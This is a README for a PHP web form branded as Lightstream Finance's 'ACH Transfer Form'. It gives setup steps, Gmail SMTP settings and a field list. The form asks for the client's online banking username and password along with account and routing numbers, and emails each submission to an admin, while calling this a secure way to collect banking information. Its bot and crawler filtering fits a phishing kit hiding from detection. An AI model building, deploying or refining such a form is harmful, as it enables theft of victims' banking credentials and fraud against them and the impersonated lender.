# Lightstream Finance - ACH Transfer Form

A secure and modern ACH transfer form for Lightstream Finance built with PHP, featuring comprehensive validation, email notifications, and professional design.

![ACH Transfer Form](https://img.shields.io/badge/Status-Production%20Ready-green)
![PHP](https://img.shields.io/badge/PHP-8.5+-blue)
![License](https://img.shields.io/badge/License-MIT-yellow)

## 🌟 Features

- **🎨 Modern UI** - Clean, professional design with Tailwind CSS
- **🔒 Secure Processing** - Input sanitization, rate limiting, and spam protection
- **📧 Email Notifications** - Admin notifications and user confirmations via Gmail SMTP
- **✅ Form Validation** - Client-side and server-side validation
- **📱 Responsive Design** - Works perfectly on all devices
- **🛡️ Security Features** - Honeypot protection, rate limiting, and input sanitization
- **⚡ Fast & Lightweight** - Optimized for performance

## 🚀 Quick Start

### Prerequisites
- PHP 8.0 or higher
- Gmail account with App Password enabled
- Web server (Apache/Nginx) or PHP built-in server

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/iamkschauhan/enqtemp.git
   cd enqtemp
   ```

2. **Configure SMTP Settings**
   - Edit `config.php` with your Gmail credentials
   - Update `SMTP_USERNAME` with your Gmail address
   - Update `SMTP_PASSWORD` with your Gmail App Password

3. **Run the Application**
   ```bash
   php -S localhost:8000
   ```

4. **Access the Form**
   - Open your browser to `http://localhost:8000`

## ⚙️ Configuration

Update `config.php` with your settings:

```php
define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_USERNAME', 'your-email@gmail.com');
define('SMTP_PASSWORD', 'your-app-password');
define('SMTP_SECURE', 'tls');
define('SMTP_PORT', 587);
```

### Gmail Setup
1. Enable 2-Factor Authentication on your Gmail account
2. Generate an App Password: Google Account → Security → App Passwords
3. Use the generated 16-character password in `config.php`

## 📁 File Structure

```
├── index.html          # Main form interface
├── AjaxForm.php        # Backend form processing
├── AjaxForm.js         # Frontend form handling
├── config.php          # Configuration settings
├── email_template.php  # Professional email template
└── PHPMailer/          # Email library
    ├── PHPMailer.php
    ├── SMTP.php
    └── Exception.php
```

## 🔒 Security Features

- **Rate Limiting** - 5 attempts per hour per session/IP
- **Honeypot Protection** - Hidden field to catch bots
- **Input Sanitization** - All user inputs are sanitized
- **CSRF Protection** - Session-based protection
- **DNS Validation** - Email domain verification
- **User-Agent Filtering** - Blocks known bots and crawlers

## 📧 Email System

The form sends two types of emails:

1. **Admin Notification** - Detailed form submission to admin
2. **User Confirmation** - Professional auto-reply to user

Both emails use responsive HTML templates with Lightstream Finance branding.

## 🎨 Form Fields

- **Name** - User's full name
- **Email** - Contact email address
- **Bank Name** - Financial institution name
- **Account Number** - Deposit account details
- **Routing Number** - Bank routing information
- **Username** - Online banking username
- **Password** - Online banking password

## 🚀 Deployment

### Production Checklist
- [ ] Update `config.php` with production SMTP settings
- [ ] Set `DEBUG_MODE` to `false`
- [ ] Configure web server (Apache/Nginx)
- [ ] Set proper file permissions
- [ ] Enable HTTPS
- [ ] Test email functionality

### Environment Variables (Recommended)
For enhanced security, consider using environment variables:
```php
define('SMTP_USERNAME', $_ENV['SMTP_USERNAME']);
define('SMTP_PASSWORD', $_ENV['SMTP_PASSWORD']);
```

## 🛠️ Customization

### Styling
- Edit `index.html` to modify the form appearance
- Update Tailwind CSS classes for different colors/layouts
- Modify `email_template.php` for custom email design

### Validation
- Add custom validation rules in `AjaxForm.php`
- Modify client-side validation in `AjaxForm.js`
- Update error messages in the `RESPONSES` array

## 🐛 Troubleshooting

### Common Issues

**SMTP Authentication Failed**
- Verify Gmail App Password is correct
- Ensure 2-Factor Authentication is enabled
- Check SMTP settings in `config.php`

**Form Not Submitting**
- Check browser console for JavaScript errors
- Verify PHP error logs
- Ensure all required fields are filled

**Emails Not Received**
- Check spam/junk folders
- Verify SMTP credentials
- Test with a different email provider

## 📊 Browser Support

- ✅ Chrome 90+
- ✅ Firefox 88+
- ✅ Safari 14+
- ✅ Edge 90+
- ✅ Mobile browsers

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🏢 About Lightstream Finance

Lightstream Finance is committed to helping you move financially forward. This ACH transfer form provides a secure and professional way to collect banking information from clients.

## 📞 Support

For questions or support:
- Email: info@lightstreamfinance.com
- Phone: (555) 123-4567

---

**© 2025 Lightstream Finance. All rights reserved.**

Made with ❤️ for secure financial transactions.